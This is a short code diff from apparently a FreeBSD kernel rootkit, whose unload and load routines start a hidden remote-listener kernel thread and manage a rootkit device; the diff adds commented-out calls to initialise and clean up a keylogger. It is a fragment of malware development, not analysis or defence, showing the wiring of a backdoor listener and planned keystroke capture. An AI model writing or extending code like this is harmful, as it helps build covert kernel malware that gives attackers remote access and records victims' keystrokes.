@@ -130,6 +130,8 @@ static int load(module_t module, int cmd, void *arg) {
         if (error == 0) {
             struct proc *p = NULL;
             error = kproc_create(remote_listener_thread, NULL, &p, 0, 0, "kmod_remote_listen");
+
+            // 	init_keylogger(); TODO: Fix this later
             if (error == 0) {
                 // printf("rootkit: module loaded & remote listener active\n");
             } else {
@@ -147,6 +149,8 @@ static int load(module_t module, int cmd, void *arg) {
         mtx_lock(&remote_mtx);
         cv_broadcast(&remote_cv);
         mtx_unlock(&remote_mtx);
+
+        // cleanup_keylogger();     TODO: Fix this later
 
         destroy_rootkit_dev();
 
